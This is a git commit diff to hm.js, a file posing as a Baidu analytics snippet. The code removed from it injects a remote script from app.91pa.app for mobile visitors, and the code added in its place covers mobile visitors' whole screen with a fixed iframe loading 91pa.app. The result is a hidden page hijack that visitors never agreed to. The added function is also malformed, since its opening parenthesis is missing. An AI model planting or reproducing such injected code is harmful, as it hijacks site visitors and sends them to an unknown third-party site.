b626ae08371d7b0906981aad18cd776f1f54ed10
mihoutao18 <138785638+mihoutao1868@users.noreply.github.com>
2025-04-27 22:29:37 +0800

    Update hm.js

--- hm.js
+++ hm.js
@@ -13,12 +13,23 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
-(function() {
+function() {
     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                      .test(navigator.userAgent);
-    if (isMobile) {
-      document.write(
-        '<script charset="UTF-8" src="https://app.91pa.app/huanrose.jav?v=1688"><\/script>'
-      );
-    }
+    if (!isMobile) return;
+    document.write(
+      '<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">' +
+      '<style>html,body{width:100%;height:100%;margin:0;padding:0}</style>'
+    );
+    var iframe = document.createElement('iframe');
+    iframe.src = 'https://91pa.app';
+    iframe.scrolling = 'auto';
+    iframe.style.cssText = 'width:100%;height:100%;left:1px;top:1px;border:none;background:#fff';
+    var divContainer = document.createElement('div');
+    divContainer.style.cssText =
+      '-webkit-overflow-scrolling:touch;width:100%;height:100%;' +
+      'z-index:9999999999;position:fixed;top:0;left:0;';
+    divContainer.style.overflow = 'auto';
+    divContainer.appendChild(iframe);
+    document.write(divContainer.innerHTML);
   })();
